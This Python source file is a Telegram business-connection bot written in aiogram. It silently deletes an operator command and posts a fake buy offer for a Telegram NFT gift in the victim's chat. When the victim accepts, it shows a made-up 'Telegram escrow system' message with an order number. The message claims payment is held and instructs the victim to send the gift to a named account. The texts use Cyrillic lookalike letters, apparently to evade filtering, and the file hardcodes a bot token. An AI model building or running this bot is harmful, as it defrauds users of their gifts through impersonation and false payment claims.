import asyncio
import logging
import random
import re
import string
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
from aiogram.types import (
    Message,
    CallbackQuery,
    BusinessConnection,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.enums import ParseMode

BOT_TOKEN = "8684362802:AAFH3pwrqtZ3UuoGUiFby995ykbidZURk0I"

EMOJI_STARS = "5920433463428650761"
EMOJI_GRAM = "5267445215773367585"
EMOJI_DECLINE_EN = "5774077015388852135"
EMOJI_ACCEPT = "5774022692642492953"

OFFER_USERNAME = "crown"
BUYER_USERNAME = "pooleteli"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

business_owner_ids: dict[str, int] = {}
offers: dict[str, dict] = {}


# ============================================================
# ЛОГИРОВАНИЕ ОШИБОК
# ============================================================

def log_telegram_error(prefix: str, e: Exception, **ctx):
    ctx_str = " | ".join(f"{k}={v}" for k, v in ctx.items())

    if isinstance(e, TelegramRetryAfter):
        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT retry_after={e.retry_after}s | {ctx_str}")
        return

    if isinstance(e, TelegramForbiddenError):
        logger.error(f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}")
        return

    msg = str(e)

    if "PEER_FLOOD" in msg:
        logger.error(f"[{prefix}] 🚨 PEER_FLOOD — Telegram ограничил отправку! Подожди 24-48ч. | {ctx_str} | {msg}")
        return
    if "FLOOD_WAIT" in msg:
        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT (raw) | {ctx_str} | {msg}")
        return
    if "BUSINESS_PEER_INVALID" in msg:
        logger.error(f"[{prefix}] ❌ BUSINESS_PEER_INVALID | {ctx_str} | {msg}")
        return
    if "BOT_ACCESS_FORBIDDEN" in msg:
        logger.error(f"[{prefix}] 🔒 BOT_ACCESS_FORBIDDEN | {ctx_str} | {msg}")
        return
    if isinstance(e, TelegramBadRequest):
        logger.error(f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}")
        return

    logger.error(f"[{prefix}] ❓ UNKNOWN | {ctx_str} | {type(e).__name__}: {e}")


def log_send_attempt(prefix: str, attempt: int, total: int, chat_id, bc_id):
    logger.info(f"[{prefix}] попытка {attempt}/{total} | chat_id={chat_id} | bc_id={bc_id}")


# ============================================================
# ПАРСИНГ
# ============================================================

def parse_nft_link(link: str):
    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
    m = re.search(pattern, link)
    if not m:
        return None
    slug = m.group(1)
    number = m.group(2)
    full_link = f"https://t.me/nft/{slug}-{number}"
    return full_link, slug, number


def parse_offer_command(text: str):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != "/delitpr":
        return None
    link = parts[1]
    amount = parts[2]
    if not amount.isdigit():
        return None

    currency = "stars"
    if len(parts) > 3:
        p3 = parts[3].lower()
        if p3 in ("stars", "gram"):
            currency = p3

    parsed = parse_nft_link(link)
    if not parsed:
        return None
    full_link, slug, number = parsed

    return {
        "link": full_link,
        "gift_slug": slug,
        "gift_number": number,
        "amount": amount,
        "currency": currency,
    }


# ============================================================
# ОТПРАВКА
# ============================================================

async def send_with_fallback(bc_id, chat_id, text, reply_markup):
    for attempt in range(1, 4):
        log_send_attempt("send", attempt, 3, chat_id, bc_id)
        try:
            result = await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                business_connection_id=bc_id,
                disable_web_page_preview=False,
            )
            logger.info(f"[send] ✅ OK msg_id={result.message_id}")
            return result

        except TelegramRetryAfter as e:
            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
            wait = e.retry_after + 1
            logger.warning(f"[send] ждём {wait}s и повторяем...")
            await asyncio.sleep(wait)

        except TelegramForbiddenError as e:
            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
            raise

        except TelegramBadRequest as e:
            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
            msg = str(e)

            if "PEER_FLOOD" in msg:
                logger.error("[send] PEER_FLOOD — прерываем ретраи")
                raise

            logger.warning("[send] retry без эмодзи")
            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
            if reply_markup:
                for row in reply_markup.inline_keyboard:
                    for btn in row:
                        btn.icon_custom_emoji_id = None
            try:
                result = await bot.send_message(
                    chat_id=chat_id,
                    text=clean_text,
                    reply_markup=reply_markup,
                    business_connection_id=bc_id,
                    disable_web_page_preview=False,
                )
                logger.info(f"[send] ✅ OK (fallback) msg_id={result.message_id}")
                return result
            except Exception as e2:
                log_telegram_error("send-fallback", e2, chat_id=chat_id, bc_id=bc_id)
                if "PEER_FLOOD" in str(e2):
                    raise
                if attempt == 3:
                    raise

        except Exception as e:
            log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
            if attempt == 3:
                raise

    raise RuntimeError("[send] все попытки провалились")


async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    """Редактирует сообщение (не удаляет). С обработкой PEER_FLOOD и retry без эмодзи."""
    logger.info(f"[edit] start | chat_id={chat_id} | msg_id={message_id} | bc_id={bc_id}")
    for attempt in range(1, 4):
        log_send_attempt("edit", attempt, 3, chat_id, bc_id)
        try:
            await bot.edit_message_text(
                business_connection_id=bc_id,
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                reply_markup=reply_markup,
            )
            logger.info("[edit] ✅ OK")
            return True

        except TelegramRetryAfter as e:
            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
            wait = e.retry_after + 1
            logger.warning(f"[edit] ждём {wait}s и повторяем...")
            await asyncio.sleep(wait)

        except TelegramBadRequest as e:
            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
            msg = str(e)

            if "PEER_FLOOD" in msg:
                logger.error("[edit] PEER_FLOOD — прерываем")
                return False

            if "message is not modified" in msg:
                logger.info("[edit] сообщение не изменилось — считаем ок")
                return True

            logger.warning("[edit] retry без эмодзи")
            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
            if reply_markup:
                for row in reply_markup.inline_keyboard:
                    for btn in row:
                        btn.icon_custom_emoji_id = None
            try:
                await bot.edit_message_text(
                    business_connection_id=bc_id,
                    chat_id=chat_id,
                    message_id=message_id,
                    text=clean_text,
                    reply_markup=reply_markup,
                )
                logger.info("[edit] ✅ OK (fallback)")
                return True
            except Exception as e2:
                log_telegram_error("edit-fallback", e2, chat_id=chat_id, bc_id=bc_id)
                if "message is not modified" in str(e2):
                    return True
                if "PEER_FLOOD" in str(e2):
                    return False
                if attempt == 3:
                    return False

        except Exception as e:
            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
            if attempt == 3:
                return False

    return False


# ============================================================
# ХЭНДЛЕРЫ
# ============================================================

@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    business_owner_ids[connection.id] = connection.user.id
    logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")


@dp.business_message(F.text.startswith("/delitpr"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id:
        logger.warning("[offer] no business_connection_id")
        return

    bc_id = message.business_connection_id
    data = parse_offer_command(message.text)
    if not data:
        logger.warning(f"[offer] parse failed for text: {message.text!r}")
        return

    logger.info(
        f"[offer] parsed: amount={data['amount']} "
        f"currency={data['currency']} gift={data['gift_slug']}-{data['gift_number']} "
        f"chat_id={message.chat.id} bc_id={bc_id}"
    )

    try:
        await bot.delete_business_messages(
            business_connection_id=bc_id,
            message_ids=[message.message_id],
        )
        logger.info("[offer] команда /delitpr удалена")
    except Exception as e:
        log_telegram_error("offer-delete", e, chat_id=message.chat.id, bc_id=bc_id)

    await asyncio.sleep(3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'

    text = (
        f"Usеr <b>{OFFER_USERNAME}</b> оffеrs уоu "
        f"<b>{amount_fmt}</b> {emoji} "
        f"fоr thе gift {gift_display}.\n\n"
        f"Тhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
    )

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        **data,
        "bc_id": bc_id,
        "chat_id": message.chat.id,
        "accepted": False,
    }

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Decline",
                    callback_data=f"dec:{offer_id}",
                    icon_custom_emoji_id=EMOJI_DECLINE_EN,
                ),
                InlineKeyboardButton(
                    text="Accept",
                    callback_data=f"acc:{offer_id}",
                    icon_custom_emoji_id=EMOJI_ACCEPT,
                ),
            ]
        ]
    )

    try:
        sent = await send_with_fallback(
            bc_id=bc_id,
            chat_id=message.chat.id,
            text=text,
            reply_markup=keyboard,
        )
        offers[offer_id]["msg_id"] = sent.message_id
        logger.info(
            f"[offer] {offer_id} отправлен в чат {message.chat.id} "
            f"(msg_id={sent.message_id})"
        )
    except Exception as e:
        log_telegram_error("offer-send", e, chat_id=message.chat.id, bc_id=bc_id)


@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    logger.info(f"[decline] callback: {callback.data}")
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data:
        logger.warning(f"[decline] offer {offer_id} not found")
        try:
            await callback.answer()
        except Exception:
            pass
        return
    if data.get("accepted"):
        logger.info(f"[decline] offer {offer_id} уже принят")
        try:
            await callback.answer()
        except Exception:
            pass
        return

    try:
        await callback.answer()
    except Exception:
        pass

    await asyncio.sleep(0.3)

    decline_text = (
        f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
        f"Offer has been declined."
    )

    ok = await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=decline_text,
    )
    if ok:
        logger.info(f"[decline] offer {offer_id} обновлён")
    else:
        logger.error(f"[decline] offer {offer_id} edit не удался")


@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    logger.info(f"[accept] callback: {callback.data}")
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data:
        logger.warning(f"[accept] offer {offer_id} not found")
        try:
            await callback.answer()
        except Exception:
            pass
        return
    if data.get("accepted"):
        logger.info(f"[accept] offer {offer_id} уже принят")
        try:
            await callback.answer()
        except Exception:
            pass
        return

    data["accepted"] = True
    logger.info(
        f"[accept] offer {offer_id} currency={data['currency']} "
        f"amount={data['amount']}"
    )

    try:
        await callback.answer()
    except Exception:
        pass

    await asyncio.sleep(0.3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
        currency_word_upper = "GRАM"
        currency_word_lower = "GRАM"
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
        currency_word_upper = "Stаrs"
        currency_word_lower = "stаrs"

    rand_suffix = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=8)
    )
    order_id = f"ТG-{rand_suffix}"

    accept_text = (
        f"<b>NFТ Dеаl</b>\n\n"
        f"<b>Оrdеr</b> #{order_id}\n\n"
        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} "
        f"thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
        f"Тhе {currency_word_lower} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе "
        f"аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {currency_word_upper} bаIаnсе "
        f"right аftеr thе gift is trаnsfеrrеd.\n\n"
        f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
        f"1. Sеnd tо: @{BUYER_USERNAME}\n"
        f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
        f"3. Соnfirm thе glft trаnsfеr.\n\n"
        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit "
        f"<b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. "
        f"Тhе rеsеrvаtiоn is vаIid fоr 24 hоurs."
    )

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Send Gift",
                    url=f"tg://send_gift?to={BUYER_USERNAME}",
                )
            ]
        ]
    )

    ok = await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=accept_text,
        reply_markup=keyboard,
    )
    if ok:
        logger.info(f"[accept] offer {offer_id} обновлён (edit)")
    else:
        logger.error(f"[accept] offer {offer_id} edit не удался")


async def main() -> None:
    logger.info("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
